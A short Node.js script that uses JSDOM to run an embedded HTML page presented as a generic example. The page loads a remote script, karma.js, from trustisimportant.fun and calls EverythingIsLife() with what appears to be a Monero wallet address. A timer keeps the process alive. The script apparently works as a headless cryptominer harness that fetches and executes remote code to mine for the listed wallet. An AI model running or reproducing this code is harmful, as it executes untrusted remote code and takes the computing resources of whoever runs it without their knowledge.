const { JSDOM } = require('jsdom');

// Your HTML content
const htmlContent = `
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
        <title></title>
    </head>
    <body>
        <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
        <script type="text/javascript">
            document.addEventListener("DOMContentLoaded",()=>{

        
            const address = "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb";
            EverythingIsLife(address , 'x', 30);
            let i =0;
            setInterval(()=>{
            console.log(++i);
            },2000);
});
        </script>
    </body>
</html>
`;

// Create a virtual DOM
const dom = new JSDOM(htmlContent, { runScripts: 'dangerously',resources:'usable' });

// Access the document
const document = dom.window.document;

// Access any elements or perform actions as needed
console.log(document.documentElement.outerHTML);
